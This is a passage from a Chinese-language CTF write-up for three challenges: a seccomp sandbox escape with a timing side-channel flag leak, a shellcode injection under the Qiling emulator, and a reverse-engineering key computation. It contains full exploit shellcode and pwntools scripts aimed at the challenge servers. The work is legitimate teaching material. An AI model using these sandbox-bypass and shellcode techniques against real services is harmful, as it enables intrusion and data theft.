<h3 id="echoserver"><a class="markdownIt-Anchor" href="#echoserver"></a> echoserver</h3>
<p><strong>seccomp绕过+侧信道攻击</strong></p>
<p><img src="/posts/764dc2d/image-20230313183057924.png" srcset="/img/loading.gif" lazyload alt="image-20230313183057924"></p>
<p>这道题的保护全开</p>
<p>main函数非常简单</p>
<p><img src="/posts/764dc2d/image-20230313183159968.png" srcset="/img/loading.gif" lazyload alt="image-20230313183159968"></p>
<p>就是输入一个字符串，然后再echo出来，这里没有什么可以利用的点。</p>
<p>不过后来在ida里面还有一段不能反汇编的指令，后来看了一下就发现利用点在这里了，手动反汇编一下</p>
<p><img src="/posts/764dc2d/image-20230313184537718.png" srcset="/img/loading.gif" lazyload alt="image-20230313184537718"></p>
<p>可以看到，只要我们输入的前两个字符是PP，就会进入下面的函数，先是用mmap申请一段可读可写可执行（mmap第三个参数为7）的内存地址，然后就可以让我们再次输入字符串到这个内存地址中，最后还会执行这个内存地址里面的代码，这里显然就是让我们注入可以利用的shellcode的了。</p>
<p>然后我就没细看直接注入常规的getshell的shellcode代码试了一下，果然出了问题，再试了下ORW系统调用，还是不行，错误忘记截图了，不过依稀应该是<code>Bad system call</code>。</p>
<p>然后就去关注了下prtctl函数，就了解到了原来这个函数是开启seccomp机制的。</p>
<blockquote>
<p><strong>函数原型</strong>：</p>
<figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/prctl.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">prctl</span><span class="hljs-params">(<span class="hljs-keyword">int</span> option, <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> arg2, <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> arg3, <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> arg4, <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> arg5)</span></span>;<br></code></pre></div></td></tr></table></figure>
<p>这个函数第一个参数可以有很多选择，这道题里面就用到了下面的两个</p>
<ol>
<li>
<p>PR*<em>SET</em><em>NO</em><em>NEW</em>*PRIVS (38)</p>
<p>使用形式：</p>
<figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">prctl(PR_SET_NO_NEW_PRIVS,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>);<br></code></pre></div></td></tr></table></figure>
<p>man手册上对这个参数的解释如下</p>
<figure class="highlight applescript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs applescript">Set <span class="hljs-keyword">the</span> calling thread&#x27;s no_new_privs attribute <span class="hljs-keyword">to</span> <span class="hljs-keyword">the</span> value <span class="hljs-keyword">in</span> arg2.  With no_new_privs <span class="hljs-keyword">set</span> <span class="hljs-keyword">to</span> <span class="hljs-number">1</span>, execve(<span class="hljs-number">2</span>) promises <span class="hljs-keyword">not</span> <span class="hljs-keyword">to</span> grant privileges <span class="hljs-keyword">to</span> do anything <span class="hljs-keyword">that</span> could <span class="hljs-keyword">not</span> have been done <span class="hljs-keyword">without</span> <span class="hljs-keyword">the</span> execve(<span class="hljs-number">2</span>) call (<span class="hljs-keyword">for</span> example, rendering <span class="hljs-keyword">the</span> <span class="hljs-keyword">set</span>-user-ID <span class="hljs-keyword">and</span> <span class="hljs-keyword">set</span>-group-ID mode bits, <span class="hljs-keyword">and</span> <span class="hljs-built_in">file</span> capabilities non-functional).  Once <span class="hljs-keyword">set</span>, <span class="hljs-keyword">the</span> no_new_privs attribute cannot be unset.  The setting <span class="hljs-keyword">of</span> this attribute <span class="hljs-keyword">is</span> inherited <span class="hljs-keyword">by</span> children created <span class="hljs-keyword">by</span> fork(<span class="hljs-number">2</span>) <span class="hljs-keyword">and</span> clone(<span class="hljs-number">2</span>), <span class="hljs-keyword">and</span> preserved across execve(<span class="hljs-number">2</span>).<br></code></pre></div></td></tr></table></figure>
<p>大致意思应该就是我们在使用这个参数的时候，如果第二个参数也被设置成了1，那就意味着我们不能使用execve，同时这个特性一旦设置，就无法取消，而且会被fork或者clone创建出来的子进程继承。</p>
</li>
<li>
<p>PR*<em>SET</em>*SECCOMP(22)</p>
<p>使用形式：</p>
<figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">prctl(PR_SET_SECCOMP,SECCOMP_MODE_FILTER,&amp;prog);<br></code></pre></div></td></tr></table></figure>
<p>这个参数就是设置沙箱过滤规则，prog里面存放的就是具体要设置的规则。可以设置要禁用或者运行哪些系统调用。</p>
</li>
</ol>
<p>还有网上看到的常规的部分系统调用被禁用的情况下可以用来代替的函数</p>
<p><img src="/posts/764dc2d/image-20230313192602995.png" srcset="/img/loading.gif" lazyload alt="image-20230313192602995"></p>
</blockquote>
<p>了解了这些，就知道这道题肯定是把execve、open之类的给禁用了，这样我们就不可以常规的shellcode注入了。</p>
<p>后来知道可以利用<a target="_blank" rel="noopener" href="https://github.com/david942j/seccomp-tools">seccomp-tools</a>来检测这道题的沙箱过滤规则，于是下了个这个（好家伙，下了半天，开了校园网半天没下成功，一直没动静，卡了很久，后来挣扎许久后换成了热点居然一下子就成功了）</p>
<p>然后用这个测试了后就发现原来禁用了那么多系统调用，基本上主流的可以利用的都被禁用完了。</p>
<p><img src="/posts/764dc2d/image-20230313191956042.png" srcset="/img/loading.gif" lazyload alt="image-20230313191956042"></p>
<p>不过之前在看代码的时候发现main刚开始的时候还执行了一个很有意思的代码，这里就是把flag读取到了一个随机申请的内存地址中，但是这个内存地址我们并不知道，所以想来就是要我们利用某些系统调用来重新获得这个存有flag的内存地址了。</p>
<p><img src="/posts/764dc2d/image-20230313192122664.png" srcset="/img/loading.gif" lazyload alt="image-20230313192122664"></p>
<p>找了很久，感觉系统调用表都翻烂了，然后突破点是在尝试一个指针指向的时候，原本想用一个指针遍历那部分内存地址，然后当访问到一个有效的地址的时候，那显然就是那个flag的地址，后来发现就天真了，如果指针指向一个不合法的地址的时候，那指针就是一个悬空指针，当我们试图对一个悬空指针进行解引用的时候，就会产生段错误，程序就会直接结束。</p>
<p>不过这就有了思路，指针不行，那我将无效指针作为参数传递给一个函数的时候，这个函数显然就会无法执行成功，那这个返回值应该一个固定的error值，然后我试了下mprotect系统调用，果然，可以成功，不过我用C语言测试的时候，发现返回值是-1，改成汇编执行shellcode时，返回值就变成了0xfffffff4)(咋和手册里说的不一样)。</p>
<p>flag内存地址拿到了，然后就想着将这个flag打印到屏幕上，我本来以为这一步很简单的，后来就发现不行，没有了write和writev，好像真不知道有什么办法可以将信息打印到屏幕了，尝试了pwrite，但是写到文件是可以的，输出到标准输出就不行了，后来搜了下原因，才知道原来pwrite相当于一个lseek和write的结合体，可以让我们指定从文件的哪一个偏移开始写，但是标准输入输出不支持修改偏移，所以当我尝试输出到标准输出的时候，就会产生<code>Illegal seek</code>报错。</p>
<p>还试了下sendto之类的socket类的发送函数，想着都有fd参数，没准都可以发送到标准输出，后来就发现他们的具体实现会有对fd类型的判断，如果不是sock型fd，就会报错。</p>
<p>后来又搜了好久，无意间看到可以利用侧信道攻击，从来没听说过这个，就去搜了下这个是啥，然后就发现原来就是来处理远程无法回显或者输出的CTF题的。</p>
<p>学习了下这个，大致原理如下：</p>
<p>就是我们猜测一个字符，去跟内存地址中的flag去比较，如果相同，就jmp到一个无限循环的地方，然后我们本机就可以根据远程的反馈时间来判断是否猜对。</p>
<p>所以最终的第一部分攻击的汇编如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs asm">mov eax,0xfffffff4<br>mov r10,0x0<br>cmp eax, 0xfffffff4<br>jne $+0x25<br><br>add r10, 0x1000<br>mov rdx,0x3<br>mov rsi,0x1000<br>mov rdi,r10<br>mov eax,20<br>shr eax,1<br>syscall<br>jmp $-0x26<br></code></pre></div></td></tr></table></figure>
<p>这里就是循环判断mprotect系统调用的返回值，直到返回一个不是0xfffffff4的值就说明我们找到了，跳出循环。</p>
<p>jmp $+0x25就是跳转到当前汇编行+0x25的位置，就是下面的lea代码开始的地方，这个具体数值我是先随便写一个，然后编译后去gdb看一下，算一下具体的确切值。</p>
<p>第二部分侧信道攻击的汇编如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs asm">lea rax,[r10]<br>mov rdx,&#123;&#125;<br>and rdx,0x3f<br>mov bl, byte ptr [rax+rdx]<br>cmp bl, &#123;&#125;<br>jz $-3<br></code></pre></div></td></tr></table></figure>
<p>这里就是一个简单的比较判断，判断值和索引位置有外部的exp脚本给出，不过我在做的时候还遇到一个很奇怪的问题，这个问题还卡了我很久，因为出现这个问题的时候就无法调试，程序直接就崩溃了，导致我半天不知道问题在哪里。</p>
<p>后来看了半天，才发现是传进去的index的问题，也就是汇编里传递给idx的值，这个值显然是会所以随着当前判断的flag字符位置变化的，那自然就会等于9,10之类的，然后就发现这些值的ascii对应的符号是下面这些，当我将它编译成二进制的时候，这些数字的汇编就会被变成下面的特殊字符，而不会识别出数字，所以就会被提前截断了，这些字符后面的二进制代码就不会被注入（太坑了，真的卡了很久）。</p>
<p><img src="/posts/764dc2d/image-20230313200646862.png" srcset="/img/loading.gif" lazyload alt="image-20230313200646862"></p>
<p><img src="/posts/764dc2d/image-20230313200832218.png" srcset="/img/loading.gif" lazyload alt="image-20230313200832218"></p>
<p>所以我后来的解决方案是给传进去的index加了64，因为6位二进制已经可以最大表示63了，flag最大也就这样，所以我加个64，再在汇编里add 0x3f，也就是取后六位，就可以绕过那些特殊数字。</p>
<p>还有一个小坑点，exp里面发送的命令要使用sendline，需要加个\n来结束scanf的输入，不然用send似乎是scanf不会结束，一直在等待输入，所以程序运行时间一直超过3秒。这样就侧信道不出来了。虽然是小坑点，但是也浪费了好久时间，我还以为是侧信道的脚本写的有问题，还找了个别的题做了一下。</p>
<p>最终的exp如下：</p>
<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> logging<br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, log_level=<span class="hljs-string">&#x27;info&#x27;</span>,proxy=(socks.SOCKS5,<span class="hljs-string">&#x27;202.120.7.12&#x27;</span>,<span class="hljs-number">13337</span>))<br><br>shellcode = <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string"></span><br><span class="hljs-string">mov eax,0xfffffff4</span><br><span class="hljs-string">mov r10,0x0</span><br><span class="hljs-string">cmp eax, 0xfffffff4</span><br><span class="hljs-string">jne $+0x25</span><br><span class="hljs-string"></span><br><span class="hljs-string">add r10, 0x1000</span><br><span class="hljs-string">mov rdx,0x3</span><br><span class="hljs-string">mov rsi,0x1000</span><br><span class="hljs-string">mov rdi,r10</span><br><span class="hljs-string">mov eax,20</span><br><span class="hljs-string">shr eax,1</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string">jmp $-0x26</span><br><span class="hljs-string"></span><br><span class="hljs-string">lea rax,[r10]</span><br><span class="hljs-string">mov rdx,&#123;&#125;</span><br><span class="hljs-string">and rdx,0x3f</span><br><span class="hljs-string">mov bl, byte ptr [rax+rdx]</span><br><span class="hljs-string">cmp bl, &#123;&#125;</span><br><span class="hljs-string">jz $-3</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br>s = <span class="hljs-string">&quot;abcdef0123456789sjtu&#123;&#125;&quot;</span><br>flag=<span class="hljs-string">&#x27;&#x27;</span><br>index = <span class="hljs-number">0</span><br><span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(s)):<br>        p = remote(<span class="hljs-string">&#x27;111.186.57.85&#x27;</span>,  <span class="hljs-number">40589</span>)<br>        <span class="hljs-comment"># p=process(&#x27;./echoserver&#x27;)</span><br>        p.recvuntil(<span class="hljs-string">&quot;===================ECHO SERVER===================\n&quot;</span>)<br>        p.sendline(<span class="hljs-string">&quot;PP&quot;</span>)<br>        <span class="hljs-comment"># gdb.attach(p)</span><br>        <span class="hljs-comment"># sleep(3)</span><br>        p.sendlineafter(<span class="hljs-string">&quot;PP\n&quot;</span>,asm(shellcode.<span class="hljs-built_in">format</span>(index+<span class="hljs-number">64</span>,<span class="hljs-built_in">ord</span>(s[i]))))<br>        <span class="hljs-built_in">print</span>(asm(shellcode.<span class="hljs-built_in">format</span>(index+<span class="hljs-number">256</span>,<span class="hljs-built_in">ord</span>(s[i]))))<br>        start = time.time()<br>        <span class="hljs-comment"># sleep(3600)</span><br>        <span class="hljs-keyword">try</span>:<br>            p.recv(timeout=<span class="hljs-number">3</span>)<br>        <span class="hljs-keyword">except</span>:<br>            <span class="hljs-keyword">pass</span><br>        end=time.time()<br>        p.close()<br>        <span class="hljs-built_in">print</span>(i)<br>        <span class="hljs-built_in">print</span>(flag)<br>        <span class="hljs-keyword">if</span> end-start&gt;<span class="hljs-number">3</span>:<br>            flag += s[i]<br><br>            index = index + <span class="hljs-number">1</span><br>            <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;&#125;&#x27;</span> <span class="hljs-keyword">in</span> flag:<br>        <span class="hljs-keyword">break</span><br></code></pre></div></td></tr></table></figure>
<p>爆破出来的flag如下：</p>
<p>sjtuctf{de18a57fadf5fabaf8dbd902005c514c}</p>
<p>通过这道题真的学习到了好多知识，第一次了解了seccomp机制，以及学习了在没有write相关函数的情况下，如何使用侧信道攻击去爆破flag。</p>
<p>参考文献：</p>
<p><a target="_blank" rel="noopener" href="https://n132.github.io/2022/07/03/Guide-of-Seccomp-in-CTF.html">Guide-of-Seccomp-in-CTF | n132</a></p>
<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/186447#h3-1">一道 CTF 题目学习 prctl 函数的沙箱过滤规则-安全客 - 安全资讯平台 (anquanke.com)</a></p>
<p><a target="_blank" rel="noopener" href="https://man7.org/linux/man-pages/man2/prctl.2.html">prctl(2) - Linux manual page (man7.org)</a></p>
<h3 id="stackoverflow"><a class="markdownIt-Anchor" href="#stackoverflow"></a> stackoverflow</h3>
<p>一开始卡了很久，以为是栈迁移之类的，因为可以利用的字节只有16位，文件本身还只开启了栈溢出。后来研究了半天无果。</p>
<p>去瞅了眼qiling是个啥，是个模拟器，于是搜了下怎么调试它，发现可以开启日志，然后也可以gdb远程调试。</p>
<p><a target="_blank" rel="noopener" href="https://docs.qiling.io/en/latest/debugger/#debug-with-gdb">Remote debugging - Qiling Framework Documentation</a></p>
<p><img src="/posts/764dc2d/image-20230307164246134.png" srcset="/img/loading.gif" lazyload alt="image-20230307164246134"></p>
<p>所以改一下启动配置，可以开启详细的日志显示和debug模式，不过要开启gdb模式需要将文件放入x8664_linux文件夹里面，不然提示找不到文件。</p>
<p>进去以后就发现了很神奇的事情，下面栈变得可执行了，PIE之类的也没有了，每次进去地址都是一样。</p>
<p><img src="/posts/764dc2d/image-20230307164420954.png" srcset="/img/loading.gif" lazyload alt="image-20230307164420954"></p>
<p>那这题就变得简单了，我们可以直接将shellcode放进read的那个buf里面，然后ret到这个地址即可。</p>
<p>而buf的地址，日志很好的告诉了我们</p>
<p><img src="/posts/764dc2d/image-20230307164625595.png" srcset="/img/loading.gif" lazyload alt="image-20230307164625595"></p>
<p>不过当我写完了常规的exp去跑的时候，发现出现如下问题</p>
<p><img src="/posts/764dc2d/image-20230307164803056.png" srcset="/img/loading.gif" lazyload alt="image-20230307164803056"></p>
<p>看一眼bin文件夹里面，果然没有sh，好家伙。</p>
<p>不过走到这里说明shellcode起码是可以注入成功的。</p>
<p>那换一个办法就可以了，pwntools还有一个shellcraft.cat(filename)，这里面相当于实现了open，read,wirte三个系统调用，所以我们可以直接用这个直接将flag打印到终端。</p>
<p>不过在实际跑远程的时候还遇到了如下三个问题：</p>
<ul>
<li>启动脚本不一样会导致buf地址发生变化，我后来把启动脚本变成题目给的脚本后，就发现buf=0x80000000dd20，问题不大，改回来就可以了。</li>
<li>刚开始不知道为啥，我连接远程的时候用asm似乎报错了，本地测试就可以，连别的远程也没有问题，搜了一下，貌似是pwntools本身的问题，不过看issue上面说是修复了，不过我更新后没啥变化，问题不大，我不用asm就可以了呗，所以手动打印了复制粘贴了一下，后来发现是proxychains的原因，因为我要用proxychains开代理才能连上远程，不过再后来做别的题的时候发现pwntools的context里面有个proxy参数可以设置代理，后来把代理加在这里就可以美美使用asm编译shellcode了）。
<ul>
<li><img src="/posts/764dc2d/image-20230307165306097.png" srcset="/img/loading.gif" lazyload alt="image-20230307165306097"></li>
</ul>
</li>
<li>shellcode的最后还要再加一个ret，我ret到源程序stackoverflow的leave指令的地方，不然程序会崩溃，因为没有正常结束，这样就无法回显flag。</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>,proxy=(socks.SOCKS5,<span class="hljs-string">&#x27;202.120.7.12&#x27;</span>,<span class="hljs-number">13337</span>))<br>p = remote(<span class="hljs-string">&#x27;111.186.57.85&#x27;</span>, <span class="hljs-number">40254</span>)<br><br>shellcode=asm(shellcraft.cat(<span class="hljs-string">&#x27;/flag&#x27;</span>))+asm(shellcraft.ret(<span class="hljs-number">0x55555555516c</span>))<br><br><span class="hljs-comment"># shellcode=b&#x27;H\xb8\x01\x01\x01\x01\x01\x01\x01\x01PH\xb8.gm`f\x01\x01\x01H1\x04$j\x02XH\x89\xe71\xf6\x0f\x05A\xba\xff\xff\xff\x7fH\x89\xc6j(Xj\x01_\x99\x0f\x05H\xb8\x01\x01\x01\x01\x01\x01\x01\x01PH\xb8mPTTTT\x01\x01H1\x04$X\xc3&#x27;</span><br><span class="hljs-comment"># print(shellcode)</span><br>ret=<span class="hljs-number">0x80000000dd20</span><br><span class="hljs-comment">#0x28的确定，就是先打印一下shellcode看一下有几个字节，然后0x80-0x8-len(shellcode)即可，输入的0x80字节刚好够我们溢出一个ret地址</span><br>payload=shellcode+<span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x28</span>)+p64(ret)<br><br>p.send(payload)<br><br>p.interactive()<br></code></pre></div></td></tr></table></figure>
<p><img src="/posts/764dc2d/image-20230307170027515.png" srcset="/img/loading.gif" lazyload alt="image-20230307170027515"></p>
<h2 id="reverse"><a class="markdownIt-Anchor" href="#reverse"></a> Reverse</h2>
<h3 id="endless"><a class="markdownIt-Anchor" href="#endless"></a> endless</h3>
<p>果然和题目说的一样，只要跑起来就可以拿到flag,不过文件被破坏了，跑不起来，所有需要我们将它看懂</p>
<p>代码逻辑也很清晰，最为重要的就是这个getkey()函数</p>
<p><img src="/posts/764dc2d/image-20230308150104567.png" srcset="/img/loading.gif" lazyload alt="image-20230308150104567"></p>
<p>里面的一个函数通过递归生成密钥key，但是因为递归很大，时间复杂度O(2^n)，所以硬算的话算不出来</p>
<p><img src="/posts/764dc2d/image-20230308150132998.png" srcset="/img/loading.gif" lazyload alt="image-20230308150132998"></p>
<p>不过只要我们给它加个数组从小到大记录一下结果，那么就变成递推了，时间复杂度O(n)</p>
<figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span>  <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span> <span class="hljs-keyword">int</span> ull;<br>ull gk[<span class="hljs-number">30000</span>];<br><span class="hljs-function">ull   <span class="hljs-title">generatingkey</span><span class="hljs-params">(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> a1)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">if</span>(gk[a1]!=<span class="hljs-number">0</span>)<span class="hljs-keyword">return</span> gk[a1];<br>  ull  v1; <span class="hljs-comment">// r10</span><br>  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> i; <span class="hljs-comment">// [sp+74h] [-2Ch]</span><br>  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> j; <span class="hljs-comment">// [sp+78h] [-28h]</span><br>  ull  v5; <span class="hljs-comment">// [sp+80h] [-20h]</span><br>  ull  v6; <span class="hljs-comment">// [sp+80h] [-20h]</span><br>  ull *v7; <span class="hljs-comment">// [sp+88h] [-18h]</span><br><br>  v7 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x748</span>uLL);<br>  v5 = <span class="hljs-number">0LL</span>;<br>  <span class="hljs-keyword">if</span> ( a1 &lt;= <span class="hljs-number">0xE8</span> )<br>  &#123;<br>    v6 = (a1 + <span class="hljs-number">1337</span>) * a1 + <span class="hljs-number">7331</span>;<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0xE9</span>; ++i )<br>    &#123;<br>      v7[i] = generatingkey(a1 - i - <span class="hljs-number">1</span>);<br>      <span class="hljs-keyword">if</span> ( (i &amp; <span class="hljs-number">1</span>) != <span class="hljs-number">0</span> &amp;&amp; i != <span class="hljs-number">232</span> )<br>        v7[i] = v7[i - <span class="hljs-number">1</span>] - v7[i];<br>    &#125;<br>    <span class="hljs-keyword">for</span> ( j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">0xE8</span>; ++j )<br>    &#123;<br>      <span class="hljs-keyword">if</span> ( (j &amp; <span class="hljs-number">1</span>) != <span class="hljs-number">0</span> )<br>        v1 = v7[j] * v7[j];<br>      <span class="hljs-keyword">else</span><br>        v1 = v7[j];<br>      v5 += v1;<br>    &#125;<br>    v6 = v5 + <span class="hljs-number">2023LL</span> * v7[<span class="hljs-number">232</span>];<br>  &#125;<br>  <span class="hljs-built_in">free</span>(v7);<br>  <span class="hljs-keyword">return</span> v6;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;   <br>    <span class="hljs-built_in">memset</span>(gk,<span class="hljs-number">0</span>,<span class="hljs-keyword">sizeof</span>(gk));<br>    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>;i&lt;=<span class="hljs-number">0x7331</span>;i++)&#123;<br>        gk[i]=generatingkey(i);<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%lu&quot;</span>,gk[<span class="hljs-number">0x7331</span>]);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure>
<p>下一步是异或得到flag，用python更简单一点，从IDA里面将pp取出来，然后注意一下PowerPC是大端序，高地址在内存低位，而下面的逻辑就是每次从key里面取一个字节，就是从低位开始取，所以就相当于从我们根据上面代码算出来的数的最高位开始取。i&amp;7就相当于i%8</p>
<p><img src="/posts/764dc2d/image-20230308150552732.png" srcset="/img/loading.gif" lazyload alt="image-20230308150552732"></p>
<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">pp=[<span class="hljs-number">0xFD</span>,<span class="hljs-number">0x58</span>, <span class="hljs-number">0xCB</span>, <span class="hljs-number">0xEE</span>,<span class="hljs-number">0x14</span> ,<span class="hljs-number">0x87</span>, <span class="hljs-number">0xE6</span> ,<span class="hljs-number">0x90</span>,<span class="hljs-number">0xFC</span> ,<span class="hljs-number">0x68</span> , <span class="hljs-number">0xCD</span> ,<span class="hljs-number">0xF4</span> ,  <span class="hljs-number">8</span> ,<span class="hljs-number">0x87</span> ,<span class="hljs-number">0xE9</span> ,<span class="hljs-number">0x91</span> ,<span class="hljs-number">0xED</span> ,<span class="hljs-number">0x58</span>  ,<span class="hljs-number">0xD7</span> ,<span class="hljs-number">0xEA</span> ,   <span class="hljs-number">8</span> ,<span class="hljs-number">0xB6</span> ,<span class="hljs-number">0xE9</span> ,<span class="hljs-number">0x9A</span>,<span class="hljs-number">0xE0</span>,<span class="hljs-number">0x54</span> ,<span class="hljs-number">0xDC</span>, <span class="hljs-number">0</span>]<br><span class="hljs-comment">#key=10247863558613795071=0x8e37b99c6dd880ff</span><br><span class="hljs-comment">#大端序，不用换顺序，首先取出来的就是这个数的高位</span><br>key=[<span class="hljs-number">0x8e</span>,<span class="hljs-number">0x37</span>,<span class="hljs-number">0xb9</span>,<span class="hljs-number">0x9c</span>,<span class="hljs-number">0x6d</span>,<span class="hljs-number">0xd8</span>,<span class="hljs-number">0x80</span>,<span class="hljs-number">0xff</span>]<br>result=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">27</span>):<br>    kk=key[i%<span class="hljs-number">8</span>]^pp[i]<br>    